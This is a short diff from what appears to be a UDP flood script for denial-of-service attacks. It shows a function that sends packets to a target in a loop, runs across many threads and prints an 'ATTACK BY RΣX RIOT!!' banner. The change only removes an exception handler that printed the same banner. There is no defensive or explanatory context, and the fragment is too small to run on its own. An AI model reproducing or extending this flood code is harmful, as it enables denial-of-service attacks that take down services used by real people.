@@ -44,8 +44,6 @@ def ppx():
   		for x in range(times):
   			sock.sendto(data,datab,apa)
   		print("\033[1;36;40mATTACK BY \033[1;31;40mRΣX RIOT!!")
-  	except:
-  		print("\033[1;36;40mATTACK BY \033[1;31;40mRΣX RIOT!!")
               
 for y in range(threads):
   rex = threading.Thread(target = ppx)
